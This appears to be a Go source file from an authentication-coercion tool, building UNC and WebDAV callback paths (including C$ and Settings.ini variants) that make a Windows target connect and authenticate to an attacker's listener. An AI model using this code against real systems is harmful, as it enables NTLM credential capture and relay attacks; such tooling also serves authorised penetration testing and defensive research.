package coerce

import (
	"fmt"
)

// buildCallbackPath builds a callback path for coercion
func buildCallbackPath(listener string, useHTTP bool, httpPort int) string {
	if useHTTP {
		// HTTP/WebDAV format: \\listener@80\path
		if httpPort == 0 {
			httpPort = 80
		}
		return fmt.Sprintf("\\\\%s@%d/test\\file.txt", listener, httpPort)
	}
	// UNC format: \\listener\share\file
	return fmt.Sprintf("\\\\%s\\share\\file.txt", listener)
}

// buildCallbackPaths builds multiple path variations for maximum compatibility
func buildCallbackPaths(listener string, useHTTP bool, httpPort int) []string {
	if useHTTP {
		if httpPort == 0 {
			httpPort = 80
		}
		return []string{
			// Various WebDAV path formats that work across Windows versions
			fmt.Sprintf("\\\\%s@%d/test\\Settings.ini", listener, httpPort),
			fmt.Sprintf("\\\\%s@%d/test/Settings.ini", listener, httpPort),
			fmt.Sprintf("\\\\%s@%d\\test\\Settings.ini", listener, httpPort),
		}
	}

	// UNC path variations
	return []string{
		// Standard variations
		fmt.Sprintf("\\\\%s\\share\\file.txt", listener),
		fmt.Sprintf("\\\\%s\\C$\\file.txt", listener),
		// With subfolders
		fmt.Sprintf("\\\\%s\\share\\sub\\file.txt", listener),
	}
}
